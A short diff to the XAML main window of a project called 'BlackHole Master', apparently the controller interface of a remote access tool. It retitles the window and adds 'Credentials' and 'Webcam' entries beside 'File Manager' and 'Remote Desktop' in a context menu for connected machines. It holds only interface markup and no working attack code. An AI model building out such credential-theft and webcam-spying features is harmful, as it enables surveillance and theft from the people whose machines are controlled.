@@ -5,7 +5,7 @@
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:BlackHole.Master"
         mc:Ignorable="d"
-        Title="MainWindow" Height="700" Width="1000"
+        Title="BlackHole Master" Height="700" Width="1000"
         Loaded="OnLoaded"
         Closing="OnClosing">
     
@@ -23,8 +23,10 @@
                 </ListView.View>
                 <ListView.ContextMenu>
                     <ContextMenu>
-                        <MenuItem Header="FileManager" Click="OpenFileManager" Icon="{StaticResource FileManagerIcon}" />
-                        <MenuItem Header="RemoteDesktop" Click="OpenRemoteDesktop" Icon="{StaticResource RemoteDesktopIcon}" />
+                        <MenuItem Header="File Manager" Click="OpenFileManager" Icon="{StaticResource FileManagerIcon}" />
+                        <MenuItem Header="Remote Desktop" Click="OpenRemoteDesktop" Icon="{StaticResource RemoteDesktopIcon}" />
+                        <MenuItem Header="Credentials" Click="OpenCredentialsWindow" />
+                        <MenuItem Header="Webcam" Click="OpenWebcamWindow" />
                     </ContextMenu>
                 </ListView.ContextMenu>
             </ListView>
